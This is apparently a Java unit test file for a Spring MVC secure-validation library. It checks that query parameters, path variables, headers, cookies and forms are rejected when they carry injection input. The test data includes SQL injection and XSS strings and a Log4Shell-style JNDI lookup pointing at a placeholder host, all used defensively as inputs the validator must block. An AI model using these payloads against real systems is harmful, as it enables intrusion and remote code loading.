package ru.sbernpf.util;

import jakarta.servlet.http.Cookie;
import org.junit.jupiter.api.Test;
import org.springframework.boot.autoconfigure.AutoConfigurations;
import org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration;
import org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration;
import org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration;
import org.springframework.boot.test.context.runner.WebApplicationContextRunner;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.ResultMatcher;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.mvc.method.annotation.MvcUriComponentsBuilder;
import ru.sbernpf.util.autoconfigure.SecureValidationAutoConfiguration;
import ru.sbernpf.util.autoconfigure.SecureWebMvcAutoConfiguration;

import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

class SecureWebMvcTest {

    private static final String SQL = "' OR 1=1 --";
    private static final String XSS = "<script>alert(1)</script>";

    public static class SearchForm {
        private String query;

        public String getQuery() {
            return query;
        }

        public void setQuery(String query) {
            this.query = query;
        }
    }

    @RestController
    public static class TestController {

        @GetMapping("/param")
        public String param(@RequestParam String q) {
            return q;
        }

        @GetMapping("/implicit")
        public String implicit(String q) {
            return q;
        }

        @GetMapping("/list")
        public int list(@RequestParam List<String> q) {
            return q.size();
        }

        @GetMapping("/optional")
        public String optional(@RequestParam Optional<String> q) {
            return q.orElse("none");
        }

        @GetMapping("/map")
        public int map(@RequestParam Map<String, String> params) {
            return params.size();
        }

        @GetMapping("/path/{id}")
        public String path(@PathVariable String id) {
            return id;
        }

        @GetMapping("/header")
        public String header(@RequestHeader("X-Trace") String trace) {
            return trace;
        }

        @GetMapping("/headers")
        public int headers(@RequestHeader Map<String, String> headers) {
            return headers.size();
        }

        @GetMapping("/accept")
        public String accept(@RequestHeader("Accept") @SecureField(skip = SecurityCheck.SQL_INJECTION) String accept) {
            return accept;
        }

        @GetMapping("/cookie")
        public String cookie(@CookieValue String session) {
            return session;
        }

        @PostMapping("/form")
        public String form(@ModelAttribute SearchForm form) {
            return form.getQuery();
        }

        @PostMapping("/form-implicit")
        public String formImplicit(SearchForm form) {
            return form.getQuery();
        }

        @GetMapping("/short")
        public String shortParam(@RequestParam @SecureField(maxLength = 3) String q) {
            return q;
        }

        @GetMapping("/ignored")
        public String ignored(@RequestParam @SecureField(ignore = true) String q) {
            return q;
        }

        @GetMapping("/date")
        public String date(@RequestParam @DateTimeRange(min = "2000-01-01") LocalDate from) {
            return from.toString();
        }

        @GetMapping("/number")
        public double number(@RequestParam double value) {
            return value;
        }

        @GetMapping("/code")
        public String code(@RequestParam @SecureField(pattern = "[A-Z]{3}") String code) {
            return code;
        }

        @GetMapping("/page")
        public int page(@RequestParam @SecureField(min = "1", max = "100") int page) {
            return page;
        }

        @GetMapping("/link")
        public String link() {
            return MvcUriComponentsBuilder.fromMethodName(TestController.class, "param", "value").build().toUriString();
        }

        @PostMapping("/upload")
        public long upload(@RequestParam MultipartFile file) {
            return file.getSize();
        }
    }

    private final WebApplicationContextRunner runner = new WebApplicationContextRunner()
            .withConfiguration(AutoConfigurations.of(SecureValidationAutoConfiguration.class,
                    SecureWebMvcAutoConfiguration.class, JacksonAutoConfiguration.class,
                    HttpMessageConvertersAutoConfiguration.class, WebMvcAutoConfiguration.class))
            .withUserConfiguration(TestController.class);

    private void expect(MockHttpServletRequestBuilder request, ResultMatcher result) {
        runner.run(ctx -> MockMvcBuilders.webAppContextSetup(ctx).build().perform(request).andExpect(result));
    }

    @Test
    void acceptsCleanValues() {
        expect(get("/param").param("q", "Иванов"), status().isOk());
        expect(get("/path/42"), status().isOk());
        expect(post("/form").param("query", "O'Brien"), status().isOk());
    }

    @Test
    void rejectsQueryParameters() {
        expect(get("/param").param("q", SQL), status().isBadRequest());
        expect(get("/implicit").param("q", SQL), status().isBadRequest());
        expect(get("/list").param("q", "ok", XSS), status().isBadRequest());
        expect(get("/optional").param("q", XSS), status().isBadRequest());
        expect(get("/map").param("any", XSS), status().isBadRequest());
    }

    @Test
    void rejectsPathVariables() {
        expect(get("/path/{id}", "1 UNION SELECT 1"), status().isBadRequest());
    }

    @Test
    void rejectsHeadersAndCookies() {
        expect(get("/header").header("X-Trace", XSS), status().isBadRequest());
        expect(get("/cookie").cookie(new Cookie("session", "${jndi:ldap://evil/a}")), status().isBadRequest());
    }

    @Test
    void rejectsForms() {
        expect(post("/form").param("query", SQL), status().isBadRequest());
        expect(post("/form-implicit").param("query", XSS), status().isBadRequest());
    }

    @Test
    void rejectsNumbersAndDates() {
        expect(get("/number").param("value", "NaN"), status().isBadRequest());
        expect(get("/date").param("from", "1999-12-31"), status().isBadRequest());
        expect(get("/date").param("from", "2001-01-01"), status().isOk());
    }

    @Test
    void appliesParameterAnnotations() {
        expect(get("/short").param("q", "abcd"), status().isBadRequest());
        expect(get("/ignored").param("q", SQL), status().isOk());
        expect(get("/accept").header("Accept", "*/*"), status().isOk());
    }

    @Test
    void appliesPatternAndNumberRangeToParameters() {
        expect(get("/code").param("code", "ABC"), status().isOk());
        expect(get("/code").param("code", "abc"), status().isBadRequest());
        expect(get("/page").param("page", "100"), status().isOk());
        expect(get("/page").param("page", "101"), status().isBadRequest());
        expect(get("/page").param("page", "0"), status().isBadRequest());
    }

    @Test
    void doesNotCheckHeaderMapsAndFiles() {
        expect(get("/headers").header("Accept", "*/*"), status().isOk());
        expect(multipart("/upload").file(new MockMultipartFile("file", XSS.getBytes(StandardCharsets.UTF_8))),
                status().isOk());
    }

    @Test
    void canBeDisabled() {
        for (String property : List.of("sbernpf.secure-validation.web.enabled", "sbernpf.secure-validation.enabled")) {
            runner.withPropertyValues(property + "=false").run(ctx -> MockMvcBuilders.webAppContextSetup(ctx).build()
                    .perform(get("/param").param("q", SQL)).andExpect(status().isOk()));
        }
    }

    @Test
    void keepsResolversVisibleToUriBuilder() {
        expect(get("/link"), result -> assertThat(result.getResponse().getContentAsString()).contains("q=value"));
    }
}
